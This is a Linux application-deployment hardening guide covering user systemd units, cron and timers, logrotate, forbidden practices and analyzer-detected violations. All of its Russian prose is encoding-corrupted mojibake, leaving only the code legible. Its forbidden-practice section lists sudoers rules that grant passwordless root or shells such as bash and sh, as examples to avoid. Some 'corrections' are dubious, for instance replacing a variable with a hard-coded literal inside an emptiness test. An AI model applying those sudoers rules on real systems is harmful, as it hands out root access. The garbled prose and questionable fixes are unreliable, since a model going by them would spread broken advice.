**–ü—Ä–∏–Ω—Ü–∏–ø:** –°–µ—Ä–≤–∏—Å—ã –ø–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤ **–ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**.

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ù–µ —Ç—Ä–µ–±—É—é—Ç root –ø—Ä–∞–≤
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∏–∑–æ–ª—è—Ü–∏—è
- ‚úÖ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ—Ç –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- ‚úÖ –õ–æ–≥–∏ –æ—Ç–¥–µ–ª–µ–Ω—ã –æ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö

**–†–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ:**
```
$HOME/.config/systemd/user/
‚îî‚îÄ‚îÄ myapp.service
```

**–ü—Ä–∏–º–µ—Ä unit —Ñ–∞–π–ª–∞:**
```ini
[Unit]
Description=My Application Service
After=network.target

[Service]
Type=simple
# User –∏ Group –Ω–µ —É–∫–∞–∑—ã–≤–∞—é—Ç—Å—è (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ = —Ç–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/bin/myapp --config /opt/myapp/config/app.conf
Restart=on-failure
RestartSec=10s

# –õ–æ–≥–∏ –≤ journald (–ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
StandardOutput=journal
StandardError=journal

# –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è —Ä–µ—Å—É—Ä—Å–æ–≤
MemoryLimit=2G
CPUQuota=50%

[Install]
WantedBy=default.target
```

**–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –û—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–ë–ï–ó sudo!)
systemctl --user daemon-reload
systemctl --user enable myapp
systemctl --user start myapp
systemctl --user status myapp
systemctl --user stop myapp

# –ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤
journalctl --user -u myapp
journalctl --user -u myapp --follow
```

**–ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å–µ—Ä–≤–µ—Ä–∞:**
```bash
# –í–∫–ª—é—á–∏—Ç—å "lingering" (—Å–µ—Ä–≤–∏—Å—ã –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è –¥–∞–∂–µ –±–µ–∑ –≤—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
sudo loginctl enable-linger myapp_sys
```

---

### –°–æ–∑–¥–∞–Ω–∏–µ User Unit –¥–ª—è NoLogin –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ü—Ä–æ–±–ª–µ–º–∞:** –°–£–ó –∏–º–µ–µ—Ç `NoLogin` ‚Üí –Ω–µ–ª—å–∑—è –≤–æ–π—Ç–∏ –Ω–∞–ø—Ä—è–º—É—é.

**–†–µ—à–µ–Ω–∏–µ:** –°–æ–∑–¥–∞–≤–∞—Ç—å unit –æ—Ç –ü–£–ó –∏–ª–∏ –¢–£–ó —Å –ø—Ä–∞–≤–∞–º–∏ sudo.

**–ü—Ä–æ—Ü–µ—Å—Å:**

**1. –°–æ–∑–¥–∞—Ç—å unit —Ñ–∞–π–ª:**
```bash
# –û—Ç –ü–£–ó –∏–ª–∏ –¢–£–ó
sudo -u myapp_sys mkdir -p /home/myapp_sys/.config/systemd/user
sudo -u myapp_sys bash -c 'cat > /home/myapp_sys/.config/systemd/user/myapp.service << EOF
[Unit]
Description=My Application
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/bin/myapp
Restart=on-failure

[Install]
WantedBy=default.target
EOF'
```

**2. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–∞–≤–∞:**
```bash
sudo -u myapp_sys chmod 644 /home/myapp_sys/.config/systemd/user/myapp.service
```

**3. –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å:**
```bash
# –í–∫–ª—é—á–∏—Ç—å lingering
sudo loginctl enable-linger myapp_sys

# –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å systemd
sudo -u myapp_sys systemctl --user daemon-reload

# –í–∫–ª—é—á–∏—Ç—å –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
sudo -u myapp_sys systemctl --user enable myapp

# –ó–∞–ø—É—Å—Ç–∏—Ç—å
sudo -u myapp_sys systemctl --user start myapp
```

**4. –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ (–æ—Ç –ü–£–ó/–¢–£–ó —Å sudo –ø—Ä–∞–≤–∞–º–∏):**
```bash
# –í sudoers –¥–ª—è –ü–£–ó:
myapp_admin ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user restart myapp
myapp_admin ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user stop myapp
myapp_admin ALL=(myapp_sys) NOPASSWD: NOEXEC: /usr/bin/systemctl --user status myapp

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:
sudo -u myapp_sys systemctl --user restart myapp
sudo -u myapp_sys systemctl --user status myapp
```

**–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è:**
- [–ö–∞–∫ —Å–æ–∑–¥–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π —Å–µ—Ä–≤–∏—Å systemd –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ (nologin) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è?]
- [–û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–æ–≤ –ø–æ —Å–µ—Ç–∏ —Å –ø–æ–º–æ—â—å—é rsyslogd –±–µ–∑ –ø—Ä–∞–≤ root]

---

### ‚ùå –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã (–ù–ï —Ä–µ–∫–æ–º–µ–Ω–¥—É—é—Ç—Å—è –¥–ª—è –ø—Ä–æ–¥–∞–∫—à–Ω–∞)

**–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å, –Ω–æ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è:**
- `tmux` + —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞
- `nohup` + —Ñ–æ–Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å
- `crontab @reboot`

**–ü–æ—á–µ–º—É –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é—Ç—Å—è:**
- ‚ùå –ù–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞ –ø—Ä–∏ –ø–∞–¥–µ–Ω–∏–∏
- ‚ùå –°–ª–æ–∂–Ω–µ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
- ‚ùå –ù–µ—Ç –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å systemd –∏ journald
- ‚ùå –ü—Ä–æ–±–ª–µ–º—ã —Å –ª–æ–≥–∞–º–∏

---

### –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–∞–¥–∞–Ω–∏–π

**–í–∞—Ä–∏–∞–Ω—Ç 1: Crontab –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –¥–ª—è –ø—Ä–æ—Å—Ç—ã—Ö –∑–∞–¥–∞—á)**

```bash
# –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
crontab -e

# –ò–ª–∏ –æ—Ç –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—Å sudo –ø—Ä–∞–≤–∞–º–∏)
sudo -u myapp_sys crontab -e

# –ü—Ä–∏–º–µ—Ä: –ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞ –∫–∞–∂–¥—ã–π —á–∞—Å
0 * * * * /opt/myapp/scripts/hourly_job.sh

# –ü—Ä–∏–º–µ—Ä: –ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞ –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –≤ 3:00
0 3 * * * /opt/myapp/scripts/daily_cleanup.sh
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ü—Ä–æ—Å—Ç–æ
- ‚úÖ –ó–∞–¥–∞—á–∏ –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è –ø–æ–¥ –Ω—É–∂–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
- ‚úÖ –ù–µ —Ç—Ä–µ–±—É–µ—Ç root

---

**–í–∞—Ä–∏–∞–Ω—Ç 2: Systemd Timer (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –¥–ª—è —Å–ª–æ–∂–Ω—ã—Ö –∑–∞–¥–∞—á)**

**1. –°–æ–∑–¥–∞—Ç—å service:**
```bash
# $HOME/.config/systemd/user/myapp-cleanup.service
[Unit]
Description=MyApp Cleanup Job

[Service]
Type=oneshot
ExecStart=/opt/myapp/scripts/cleanup.sh
```

**2. –°–æ–∑–¥–∞—Ç—å timer:**
```bash
# $HOME/.config/systemd/user/myapp-cleanup.timer
[Unit]
Description=MyApp Cleanup Timer
Requires=myapp-cleanup.service

[Timer]
# –ó–∞–ø—É—Å–∫–∞—Ç—å –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –≤ 3:00
OnCalendar=daily
OnCalendar=03:00
Persistent=true

[Install]
WantedBy=timers.target
```

**3. –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å:**
```bash
systemctl --user daemon-reload
systemctl --user enable myapp-cleanup.timer
systemctl --user start myapp-cleanup.timer

# –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å
systemctl --user list-timers
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å systemd
- ‚úÖ –õ–æ–≥–∏ –≤ journald
- ‚úÖ –ë–æ–ª–µ–µ —Ç–æ—á–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏–µ–º
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –æ—à–∏–±–∫–∞—Ö

---

### –†–æ—Ç–∞—Ü–∏—è –ª–æ–≥–æ–≤

**–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `logrotate` –≤ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

**–ü—Ä–æ—Ü–µ—Å—Å:**

**1. –°–æ–∑–¥–∞—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é logrotate:**
```bash
mkdir -p $HOME/logrotate

cat > $HOME/logrotate/myapp.conf << 'EOF'
/opt/myapp/logs/*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 640 myapp_sys myapp_sys
    sharedscripts
    postrotate
        # –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø–µ—Ä–µ–æ—Ç–∫—Ä—ã—Ç–∏—è –ª–æ–≥–æ–≤ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
        systemctl --user reload myapp || true
    endscript
}
EOF
```

**2. –î–æ–±–∞–≤–∏—Ç—å –≤ crontab:**
```bash
crontab -e

# –î–æ–±–∞–≤–∏—Ç—å (—Ä–æ—Ç–∞—Ü–∏—è –∫–∞–∂–¥—ã–π —á–∞—Å –≤ :00):
0 * * * * /usr/sbin/logrotate --state $HOME/logrotate/state -f $HOME/logrotate/myapp.conf
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–µ–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ crontab –≤ `/etc`
- ‚úÖ –ü—Ä–æ—Ü–µ—Å—Å —Ä–æ—Ç–∞—Ü–∏–∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ø–æ–¥ –Ω—É–∂–Ω—ã–º –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
- ‚úÖ –ù–µ —Ç—Ä–µ–±—É–µ—Ç root –ø—Ä–∞–≤

---

## ‚õî –ó–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ –ø—Ä–∞–∫—Ç–∏–∫–∏

### 1. –°–∏—Å—Ç–µ–º–Ω—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏

**‚ùå –ó–ê–ü–†–ï–©–ï–ù–û:**
```bash
# –†–∞–∑–º–µ—â–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–∞—Ö
/usr/local/bin/myapp
/etc/myapp/config.conf
/var/log/myapp/app.log
/mnt/myapp_data
```

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–∏–∫–ª–∞–¥–Ω—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤
/opt/myapp/bin/myapp
/opt/myapp/config/config.conf
/opt/myapp/logs/app.log
/opt/myapp/data/
```

---

### 2. –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤, —É–ø—Ä–∞–≤–ª—è–µ–º—ã—Ö –ø–∞–∫–µ—Ç–Ω—ã–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º

**‚ùå –ó–ê–ü–†–ï–©–ï–ù–û:**
```bash
# –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –∏–∑ RPM/DEB –ø–∞–∫–µ—Ç–æ–≤
chown myuser:myuser /etc/grafana/grafana.ini
chmod 777 /etc/prometheus/prometheus.yml
rm /usr/lib/systemd/system/grafana.service
```

**–ü—Ä–æ–±–ª–µ–º—ã:**
- –ü—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ø–∞–∫–µ—Ç–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –±—É–¥—É—Ç –ø–æ—Ç–µ—Ä—è–Ω—ã
- –ù–∞—Ä—É—à–µ–Ω–∏–µ —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ –ø–∞–∫–µ—Ç–∞
- –ü—Ä–æ–±–ª–µ–º—ã —Å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –º–µ—Ö–∞–Ω–∏–∑–º—ã –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è:

# –î–ª—è systemd:
systemctl edit grafana.service
# –°–æ–∑–¥–∞—Å—Ç /etc/systemd/system/grafana.service.d/override.conf

# –î–ª—è –∫–æ–Ω—Ñ–∏–≥–æ–≤ - —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –ø—Ä–∏–∫–ª–∞–¥–Ω–æ–π –∫–∞—Ç–∞–ª–æ–≥:
cp /etc/grafana/grafana.ini /opt/myapp/config/grafana.ini
# –ò —É–∫–∞–∑–∞—Ç—å –ø—É—Ç—å –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ:
grafana-server --config /opt/myapp/config/grafana.ini
```

---

### 3. –®–∏—Ä–æ–∫–∏–µ sudo –ø—Ä–∞–≤–∞

**‚ùå –ó–ê–ü–†–ï–©–ï–ù–û:**
```sudoers
myuser ALL=(ALL) NOPASSWD: ALL
myuser ALL=(ALL) NOPASSWD: /usr/bin/* 
myuser ALL=(ALL) NOPASSWD: /usr/bin/bash
myuser ALL=(ALL) NOPASSWD: /usr/bin/sh
```

**–ü—Ä–æ–±–ª–µ–º—ã:**
- –§–∞–∫—Ç–∏—á–µ—Å–∫–∏ = root –ø—Ä–∞–≤–∞
- –ù–∞—Ä—É—à–µ–Ω–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø–∞ –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø–æ–ª–Ω–æ–º–æ—á–∏–π
- –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç—Å–ª–µ–¥–∏—Ç—å, –∫–∞–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã –≤—ã–ø–æ–ª–Ω—è–ª–∏—Å—å

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```sudoers
# –Ø–≤–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
myuser ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user restart myapp
myuser ALL=(myapp_sys) NOPASSWD: /usr/bin/systemctl --user stop myapp
myuser ALL=(myapp_sys) NOPASSWD: NOEXEC: /usr/bin/systemctl --user status myapp
```

---

### 4. –î–∏–∞–≥–Ω–æ—Å—Ç–∏—á–µ—Å–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã —Å root –ø—Ä–∞–≤–∞–º–∏

**‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ó–∞–ø—Ä–æ—Å sudo –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
sudo perf record -a -g
sudo lsof -i
sudo netstat -tulpn
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ï—Å–ª–∏ –Ω—É–∂–µ–Ω root –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏ **—Å–≤–æ–∏—Ö** –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ ‚Üí –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ê–° –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è.

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –ë–ï–ó root (–¥–ª—è —Å–≤–æ–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤)
perf record -p $(pgrep myapp)
lsof -p $(pgrep myapp)
netstat -tulpn | grep myapp
ps aux | grep myapp
top -p $(pgrep myapp)
```

**–ï—Å–ª–∏ –Ω—É–∂–Ω–æ –¥–∏–∞–≥–Ω–æ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã –¥—Ä—É–≥–æ–≥–æ (–Ω–æ —Ç–æ–∂–µ –≤–∞—à–µ–≥–æ) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:**
```bash
# –ü–µ—Ä–µ–∫–ª—é—á–∏—Ç—å—Å—è —á–µ—Ä–µ–∑ sudo
sudo -u myapp_sys bash
# –¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–∏–∞–≥–Ω–æ—Å—Ç–∏—á–µ—Å–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã
perf record -p $(pgrep myapp)
```

---

## üö® –î–µ—Ç–µ–∫—Ç–∏—Ä—É–µ–º—ã–µ –Ω–∞—Ä—É—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

### –ö–∞—Ç–µ–≥–æ—Ä–∏–∏ –Ω–∞—Ä—É—à–µ–Ω–∏–π

–ê–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ —Ç–∏–ø—ã –Ω–∞—Ä—É—à–µ–Ω–∏–π:

---

### 1. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –∫–æ–º–∞–Ω–¥–∞—Ö

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
if [[ -z "$vault_task_id" || "$vault_task_id" == "null" ]]; then
    # ...
fi

port="$PROMETHEUS_PORT"
ss -tln | grep ":$port"
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤–º–µ—Å—Ç–æ –∫–æ–º–∞–Ω–¥ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–º—É –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–¥–º–µ–Ω—É –∫–æ–º–∞–Ω–¥—ã –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –≤–º–µ—Å—Ç–æ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –º–µ—Å—Ç–∞—Ö
if [[ -z "12345" || "12345" == "null" ]]; then
    # ...
fi

# –ò–ª–∏ –≤–∞–ª–∏–¥–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
if [[ "$PROMETHEUS_PORT" =~ ^[0-9]+$ ]]; then
    ss -tln | grep ":$PROMETHEUS_PORT"
fi
```

---

### 2. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –¥–µ—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ–º–∞–Ω–¥

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
# ss, netstat —Ç—Ä–µ–±—É—é—Ç root –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –≤—Å–µ—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
ss -tlnp | grep ":$port"
pids=$(ss -tlnp | grep ":$port " | awk ...)

# openssl –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤
openssl pkey -in "/opt/vault/certs/server_bundle.pem" -out "/etc/grafana/cert/key.key"

# chown, chmod –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
chown prometheus:prometheus /etc/prometheus/cert
chmod 640 /etc/grafana/grafana.ini
```

**–ü—Ä–æ–±–ª–µ–º–∞:** –ü—Ä–∏–∫–ª–∞–¥–Ω–æ–µ –ü–û –Ω–µ –¥–æ–ª–∂–Ω–æ —Ç—Ä–µ–±–æ–≤–∞—Ç—å –¥–ª—è —Å–≤–æ–µ–π —Ä–∞–±–æ—Ç—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º –û–°.

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã –ë–ï–ó root:
ss -tln | grep ":$port"  # –ë–µ–∑ -p (–±–µ–∑ –ø–æ–∫–∞–∑–∞ PID)

# –†–∞–∑–º–µ—â–∞—Ç—å —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç—ã –≤ –ø—Ä–∏–∫–ª–∞–¥–Ω—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–∞—Ö:
openssl pkey -in "/opt/vault/certs/server_bundle.pem" -out "/opt/myapp/certs/key.key"
chown myapp_sys:myapp_sys /opt/myapp/certs/key.key
chmod 600 /opt/myapp/certs/key.key
```

---

### 3. –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ –∫–æ–º–∞–Ω–¥–µ systemctl

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
systemctl is-active --quiet "$service"
systemctl is-enabled --quiet "$service"
systemctl daemon-reload
systemctl restart prometheus
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö ‚Üí –ø–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥—ã
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö units –≤–º–µ—Å—Ç–æ user units
- `daemon-reload` —Ç—Ä–µ–±—É–µ—Ç root

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å user units:
systemctl --user is-active myapp
systemctl --user is-enabled myapp
systemctl --user daemon-reload
systemctl --user restart myapp

# –ò–ª–∏ —è–≤–Ω—ã–µ –ø—Ä–∞–≤–∞ –≤ sudoers (–µ—Å–ª–∏ –Ω—É–∂–Ω—ã —Å–∏—Å—Ç–µ–º–Ω—ã–µ units):
myuser ALL=(ALL\:ALL) NOPASSWD: /usr/bin/systemctl restart prometheus
myuser ALL=(ALL\:ALL) NOPASSWD: NOEXEC: /usr/bin/systemctl status prometheus
```

---

### 4. –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –≤ –∫–æ–º–∞–Ω–¥–µ chmod

**‚ùå –ù–∞—Ä—É—à–µ–Ω–∏–µ:**
```bash
chmod 640 "$VAULT_ROLE_ID_FILE" "$VAULT_SECRET_ID_FILE"
chmod --reference=/opt/vault/conf /opt/vault/certs
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö ‚Üí –≤–æ–∑–º–æ–∂–Ω–∞ —ç—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
- `--reference` –º–æ–∂–µ—Ç –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∞–≤–∞ —Å —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

**‚úÖ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:**
```bash
# –Ø–≤–Ω—ã–µ –ø—É—Ç–∏:
chmod 640 /opt/vault/conf/role_id.txt
chmod 640 /opt/vault/conf/secret_id.txt

# –Ø–≤–Ω—ã–µ –ø—Ä–∞–≤–∞ (–±–µ–∑ --reference):
chmod 750 /opt/vault/certs
```

---

